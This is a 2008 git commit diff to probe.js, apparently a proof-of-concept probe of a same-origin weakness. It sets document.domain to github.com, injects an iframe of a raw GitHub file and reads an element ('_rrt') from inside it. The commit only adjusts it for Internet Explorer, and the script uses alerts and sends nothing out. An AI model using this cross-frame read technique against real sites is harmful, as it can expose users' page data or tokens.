ceb5606cecf17fa44d5309a549dd5f48b731c6d0
U-BLACKBOOK\Gojomo <gojomo@bitzi.com>
2008-12-20 22:24:16 -0800

    ie change

--- probe.js
+++ probe.js
@@ -2,5 +2,5 @@ alert('probe:'+document.domain+' '+document.location.href);
 
 document.domain="github.com";
 
-document.write("<iframe id='if' src='http://github.com/gojomo/scratch/raw/master/friendlyframe.html'></iframe><scr"+"ipt>alert('second:'+document.domain+' '+document.location.href);function doit(){alert(document.getElementById('if').contentDocument.getElementById('_rrt').innerHTML)}</script><a href='javascript:doit();' onclick='doit()'>doit</a>");
+document.write("<iframe id='if' src='http://github.com/gojomo/scratch/raw/master/friendlyframe.html'></iframe><scr"+"ipt>alert('second:'+document.domain+' '+document.location.href);function doit(){alert(document.getElementById('if').contentWindow.document.getElementById('_rrt').innerHTML)}</script><a href='javascript:doit();' onclick='doit()'>doit</a>");
 
